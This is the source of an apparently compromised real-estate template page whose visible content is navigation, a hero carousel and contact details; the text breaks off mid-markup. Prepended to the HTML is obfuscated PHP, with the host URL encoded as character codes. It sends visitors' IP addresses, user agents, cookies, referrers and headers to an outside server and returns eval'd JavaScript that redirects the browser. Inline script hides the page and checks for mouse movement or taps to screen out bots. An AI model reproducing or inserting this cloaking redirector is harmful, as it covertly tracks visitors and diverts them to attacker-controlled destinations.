<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo506527ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo506527ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "506527";$uid="qil3sex0oo42w5ar329po8hfc";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo506527ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo506527ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo506527ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo506527ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Scary Ambitious Opossum</title>
    <meta property="og:title" content="Scary Ambitious Opossum" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta charset="utf-8" />
    <meta property="twitter:card" content="summary_large_image" />
    <a title="GDPR-compliant Web Analytics" href="https://clicky.com/101497540"></a>
<script async data-id="101497540" src="//static.getclicky.com/js"></script>


    <style data-tag="reset-style-sheet">
      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;  -webkit-font-smoothing: antialiased;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6,figure,blockquote,figcaption {  margin: 0;  padding: 0;}button {  background-color: transparent;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;  color: inherit;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}pre {  white-space: normal;}input {  padding: 2px 4px;}img {  display: block;}details {  display: block;  margin: 0;  padding: 0;}summary::-webkit-details-marker {  display: none;}[data-thq="accordion"] [data-thq="accordion-content"] {  max-height: 0;  overflow: hidden;  transition: max-height 0.3s ease-in-out;  padding: 0;}[data-thq="accordion"] details[data-thq="accordion-trigger"][open] + [data-thq="accordion-content"] {  max-height: 1000vh;}details[data-thq="accordion-trigger"][open] summary [data-thq="accordion-icon"] {  transform: rotate(180deg);}html { scroll-behavior: smooth  }
    </style>
    <style data-tag="default-style-sheet">
      html {
        font-family: Roboto;
        font-size: 1rem;
      }

      body {
        font-weight: 400;
        font-style:normal;
        text-decoration: undefined;
        text-transform: undefined;
        letter-spacing: 0.02em;
        line-height: 1.6;
        color: var(--color-on-surface);
        background: var(--color-surface);

        fill: var(--color-on-surface);
      }
    </style>
    <link
      rel="stylesheet"
      href="https://unpkg.com/animate.css@4.1.1/animate.css"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
      data-tag="font"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=STIX+Two+Text:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap"
      data-tag="font"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
      data-tag="font"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
      data-tag="font"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
      data-tag="font"
    />
    <link
      rel="stylesheet"
      href="https://unpkg.com/@teleporthq/teleport-custom-scripts/dist/style.css"
    />
    <style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo506527ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo506527ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},2000)}});</script>
  </head>
  <body>
    <link rel="stylesheet" href="./style.css" />
    <div>
      <link href="./index.css" rel="stylesheet" />

      <div class="home-container1">
        <navigation-wrapper class="navigation-wrapper">
          <!--Navigation component-->
          <div class="navigation-container1">
            <nav class="navigation">
              <div class="navigation-container">
                <a href="index.html">
                  <div
                    aria-label="Realtors Housing Developers Home"
                    class="navigation-logo"
                  >
                    <span class="section-title">
                      Realtors Housing Developers
                    </span>
                  </div>
                </a>
                <div class="navigation-desktop">
                  <ul class="navigation-links">
                    <li>
                      <a href="index.html">
                        <div class="navigation-link"><span>Homepage</span></div>
                      </a>
                    </li>
                    <li>
                      <a href="services.html">
                        <div class="navigation-link"><span>Services</span></div>
                      </a>
                    </li>
                    <li>
                      <a href="housing-developers.html">
                        <div class="navigation-link">
                          <span>Housing Developers</span>
                        </div>
                      </a>
                    </li>
                    <li>
                      <a href="privacy-policy-terms.html">
                        <div class="navigation-link">
                          <span>Privacy Policy &amp; Terms</span>
                        </div>
                      </a>
                    </li>
                    <li>
                      <a href="contact-us.html">
                        <div class="navigation-link">
                          <span>Contact Us</span>
                        </div>
                      </a>
                    </li>
                  </ul>
                  <div class="navigation-contact">
                    <a href="tel:+15551234999">
                      <div aria-label="Call us" class="navigation-contact-item">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="18"
                          height="18"
                          viewBox="0 0 24 24"
                        >
                          <path
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1 2-2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                          ></path>
                        </svg>
                        <span>+1 (555) 123-4999</span>
                      </div>
                    </a>
                    <a
                      href="mailto:partnerships@realtorshousingdevelopers?subject="
                    >
                      <div
                        aria-label="Email us"
                        class="navigation-contact-item"
                      >
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="18"
                          height="18"
                          viewBox="0 0 24 24"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"
                            ></path>
                            <rect
                              width="20"
                              height="16"
                              x="2"
                              y="4"
                              rx="2"
                            ></rect>
                          </g>
                        </svg>
                        <span>Email</span>
                      </div>
                    </a>
                  </div>
                </div>
                <button
                  aria-label="Toggle navigation menu"
                  aria-expanded="false"
                  class="navigation-toggle"
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="28"
                    height="28"
                    viewBox="0 0 24 24"
                  >
                    <path
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="2"
                      d="M4 5h16M4 12h16M4 19h16"
                    ></path>
                  </svg>
                </button>
              </div>
              <div class="navigation-mobile-overlay">
                <div class="navigation-mobile-header">
                  <a href="index.html">
                    <div
                      aria-label="Realtors Housing Developers Home"
                      class="navigation-mobile-logo"
                    >
                      <span class="section-title">
                        Realtors Housing Developers
                      </span>
                    </div>
                  </a>
                  <button
                    aria-label="Close navigation menu"
                    class="navigation-close"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="32"
                      height="32"
                      viewBox="0 0 24 24"
                    >
                      <path
                        fill="none"
                        stroke="currentColor"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M18 6L6 18M6 6l12 12"
                      ></path>
                    </svg>
                  </button>
                </div>
                <ul class="navigation-mobile-links">
                  <li>
                    <a href="index.html">
                      <div class="navigation-mobile-link">
                        <span>Homepage</span>
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="services.html">
                      <div class="navigation-mobile-link">
                        <span>Services</span>
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="housing-developers.html">
                      <div class="navigation-mobile-link">
                        <span>Housing Developers</span>
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="privacy-policy-terms.html">
                      <div class="navigation-mobile-link">
                        <span>Privacy Policy &amp; Terms</span>
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="contact-us.html">
                      <div class="navigation-mobile-link">
                        <span>Contact Us</span>
                      </div>
                    </a>
                  </li>
                </ul>
                <div class="navigation-mobile-contact">
                  <a href="tel:+15551234999">
                    <div class="navigation-mobile-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1 2-2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                        ></path>
                      </svg>
                      <span>+1 (555) 123-4999</span>
                    </div>
                  </a>
                  <a
                    href="mailto:partnerships@realtorshousingdevelopers?subject="
                  >
                    <div class="navigation-mobile-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path
                            d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"
                          ></path>
                          <rect
                            width="20"
                            height="16"
                            x="2"
                            y="4"
                            rx="2"
                          ></rect>
                        </g>
                      </svg>
                      <span>partnerships@realtorshousingdevelopers</span>
                    </div>
                  </a>
                  <div class="navigation-mobile-hours">
                    <p class="section-content">Business Hours</p>
                    <p class="section-content">
                      Monday - Friday, 9 AM - 6 PM EST
                    </p>
                  </div>
                </div>
              </div>
            </nav>
            <div class="navigation-container2">
              <div class="navigation-container3">
                <script defer="" data-name="navigation-menu-toggle">
                  document.addEventListener('DOMContentLoaded', function() {
                    (function(){
                    const navigationToggle = document.querySelector('.navigation-toggle');
                    const navigationClose = document.querySelector('.navigation-close');
                    const navigationMobileOverlay = document.querySelector('.navigation-mobile-overlay');
                    const navigationMobileLinks = document.querySelectorAll('.navigation-mobile-link');

                    function openMobileMenu() {
                      navigationMobileOverlay.style.display = 'block';
                      navigationToggle.setAttribute('aria-expanded', 'true');
                      document.body.style.overflow = 'hidden';

                      const links = navigationMobileOverlay.querySelectorAll('.navigation-mobile-link');
                      links.forEach((link, index) => {
                        link.style.opacity = '0';
                        link.style.transform = 'translateX(-20px)';
                        setTimeout(() => {
                          link.style.transition = 'all 0.4s ease';
                          link.style.opacity = '1';
                          link.style.transform = 'translateX(0)';
                        }, index * 50);
                      });
                    }

                    function closeMobileMenu() {
                      navigationMobileOverlay.style.display = 'none';
                      navigationToggle.setAttribute('aria-expanded', 'false');
                      document.body.style.overflow = '';
                    }

                    navigationToggle.addEventListener('click', openMobileMenu);
                    navigationClose.addEventListener('click', closeMobileMenu);

                    navigationMobileLinks.forEach(link => {
                      link.addEventListener('click', closeMobileMenu);
                    });

                    navigationMobileOverlay.addEventListener('click', (e) => {
                      if (e.target === navigationMobileOverlay) {
                        closeMobileMenu();
                      }
                    });

                    document.addEventListener('keydown', (e) => {
                      if (e.key === 'Escape' && navigationMobileOverlay.style.display === 'block') {
                        closeMobileMenu();
                      }
                    });
                    })()
                  });
                </script>
              </div>
            </div>
          </div>
        </navigation-wrapper>
        <section class="hero-carousel">
          <div class="hero-carousel-track">
            <div class="hero-carousel-slide hero-carousel-slide-active">
              <div class="hero-carousel-background">
                <img
                  src="https://images.pexels.com/photos/1732414/pexels-photo-1732414.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                  alt="Luxury lakeside property at sunrise"
                  class="hero-carousel-bg-image"
                />
                <div class="hero-carousel-overlay"></div>
              </div>
              <div class="hero-carousel-content-wrapper">
                <div class="hero-carousel-content">
                  <h1 class="hero-title">Find Your Dream Home Today</h1>
                  <p class="hero-subtitle">
                    Connecting buyers, sellers, and developers with exceptional
                    real estate opportunities
                  </p>
                  <div class="hero-search-bar">
                    <div class="hero-search-input-wrapper">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-search-icon"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path d="m21 21l-4.34-4.34"></path>
                          <circle cx="11" cy="11" r="8"></circle>
                        </g>
                      </svg>
                      <input
                        type="search"
                        placeholder="Search by location, property type, or listing ID"
                        class="hero-search-input"
                      />
                    </div>
                    <button class="hero-search-btn btn btn-primary">
                      Search Properties
                    </button>
                  </div>
                  <div class="hero-quick-links">
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"
                            ></path>
                            <path
                              d="M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
                            ></path>
                          </g>
                        </svg>
                        <span>Browse Listings</span>
                      </div>
                    </a>
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path d="m11 17l2 2a1 1 0 1 0 3-3"></path>
                            <path
                              d="m14 14l2.5 2.5a1 1 0 1 0 3-3l-3.88-3.88a3 3 0 0 0-4.24 0l-.88.88a1 1 0 1 1-3-3l2.81-2.81a5.79 5.79 0 0 1 7.06-.87l.47.28a2 2 0 0 0 1.42.25L21 4"
                            ></path>
                            <path
                              d="m21 3l1 11h-2M3 3L2 14l6.5 6.5a1 1 0 1 0 3-3M3 4h8"
                            ></path>
                          </g>
                        </svg>
                        <span>Meet Our Agents</span>
                      </div>
                    </a>
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="M12 10h.01M12 14h.01M12 6h.01M16 10h.01M16 14h.01M16 6h.01M8 10h.01M8 14h.01M8 6h.01M9 22v-3a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v3"
                            ></path>
                            <rect
                              width="16"
                              height="20"
                              x="4"
                              y="2"
                              rx="2"
                            ></rect>
                          </g>
                        </svg>
                        <span>Developer Partnerships</span>
                      </div>
                    </a>
                  </div>
                  <div class="hero-contact-info">
                    <div class="hero-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-contact-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                        ></path>
                      </svg>
                      <span>+1 (555) 123-4999</span>
                    </div>
                    <div class="hero-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-contact-icon"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path
                            d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"
                          ></path>
                          <rect
                            width="20"
                            height="16"
                            x="2"
                            y="4"
                            rx="2"
                          ></rect>
                        </g>
                      </svg>
                      <span>partnerships@realtorshousingdevelopers</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="hero-carousel-slide">
              <div class="hero-carousel-background">
                <img
                  src="https://images.pexels.com/photos/7031407/pexels-photo-7031407.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                  alt="Contemporary luxury villa in winter"
                  class="hero-carousel-bg-image"
                />
                <div class="hero-carousel-overlay"></div>
              </div>
              <div class="hero-carousel-content-wrapper">
                <div class="hero-carousel-content">
                  <h1 class="hero-title">Expert Real Estate Solutions</h1>
                  <p class="hero-subtitle">
                    Professional guidance for buying, selling, and developing
                    premium properties
                  </p>
                  <div class="hero-search-bar">
                    <div class="hero-search-input-wrapper">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-search-icon"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path d="m21 21l-4.34-4.34"></path>
                          <circle cx="11" cy="11" r="8"></circle>
                        </g>
                      </svg>
                      <input
                        type="search"
                        placeholder="Search by location, property type, or listing ID"
                        class="hero-search-input"
                      />
                    </div>
                    <button class="hero-search-btn btn btn-primary">
                      Search Properties
                    </button>
                  </div>
                  <div class="hero-quick-links">
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"
                            ></path>
                            <path
                              d="M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
                            ></path>
                          </g>
                        </svg>
                        <span>Browse Listings</span>
                      </div>
                    </a>
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path d="m11 17l2 2a1 1 0 1 0 3-3"></path>
                            <path
                              d="m14 14l2.5 2.5a1 1 0 1 0 3-3l-3.88-3.88a3 3 0 0 0-4.24 0l-.88.88a1 1 0 1 1-3-3l2.81-2.81a5.79 5.79 0 0 1 7.06-.87l.47.28a2 2 0 0 0 1.42.25L21 4"
                            ></path>
                            <path
                              d="m21 3l1 11h-2M3 3L2 14l6.5 6.5a1 1 0 1 0 3-3M3 4h8"
                            ></path>
                          </g>
                        </svg>
                        <span>Meet Our Agents</span>
                      </div>
                    </a>
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="M12 10h.01M12 14h.01M12 6h.01M16 10h.01M16 14h.01M16 6h.01M8 10h.01M8 14h.01M8 6h.01M9 22v-3a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v3"
                            ></path>
                            <rect
                              width="16"
                              height="20"
                              x="4"
                              y="2"
                              rx="2"
                            ></rect>
                          </g>
                        </svg>
                        <span>Developer Partnerships</span>
                      </div>
                    </a>
                  </div>
                  <div class="hero-contact-info">
                    <div class="hero-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-contact-icon"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233a14 14 0 0 0 6.392 6.384"
                        ></path>
                      </svg>
                      <span>+1 (555) 123-4999</span>
                    </div>
                    <div class="hero-contact-item">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-contact-icon"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path
                            d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"
                          ></path>
                          <rect
                            width="20"
                            height="16"
                            x="2"
                            y="4"
                            rx="2"
                          ></rect>
                        </g>
                      </svg>
                      <span>partnerships@realtorshousingdevelopers</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="hero-carousel-slide">
              <div class="hero-carousel-background">
                <img
                  src="https://images.pexels.com/photos/7174109/pexels-photo-7174109.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1500"
                  alt="Luxurious brick mansion with gardens"
                  class="hero-carousel-bg-image"
                />
                <div class="hero-carousel-overlay"></div>
              </div>
              <div class="hero-carousel-content-wrapper">
                <div class="hero-carousel-content">
                  <h1 class="hero-title">Build Your Real Estate Future</h1>
                  <p class="hero-subtitle">
                    Partnering with visionary developers and trusted realtors
                    across the nation
                  </p>
                  <div class="hero-search-bar">
                    <div class="hero-search-input-wrapper">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        class="hero-search-icon"
                      >
                        <g
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                        >
                          <path d="m21 21l-4.34-4.34"></path>
                          <circle cx="11" cy="11" r="8"></circle>
                        </g>
                      </svg>
                      <input
                        type="search"
                        placeholder="Search by location, property type, or listing ID"
                        class="hero-search-input"
                      />
                    </div>
                    <button class="hero-search-btn btn btn-primary">
                      Search Properties
                    </button>
                  </div>
                  <div class="hero-quick-links">
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
                              d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"
                            ></path>
                            <path
                              d="M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
                            ></path>
                          </g>
                        </svg>
                        <span>Browse Listings</span>
                      </div>
                    </a>
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path d="m11 17l2 2a1 1 0 1 0 3-3"></path>
                            <path
                              d="m14 14l2.5 2.5a1 1 0 1 0 3-3l-3.88-3.88a3 3 0 0 0-4.24 0l-.88.88a1 1 0 1 1-3-3l2.81-2.81a5.79 5.79 0 0 1 7.06-.87l.47.28a2 2 0 0 0 1.42.25L21 4"
                            ></path>
                            <path
                              d="m21 3l1 11h-2M3 3L2 14l6.5 6.5a1 1 0 1 0 3-3M3 4h8"
                            ></path>
                          </g>
                        </svg>
                        <span>Meet Our Agents</span>
                      </div>
                    </a>
                    <a href="#">
                      <div class="hero-quick-link">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          class="hero-quick-link-icon"
                        >
                          <g
                            fill="none"
                            stroke="currentColor"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                          >
                            <path
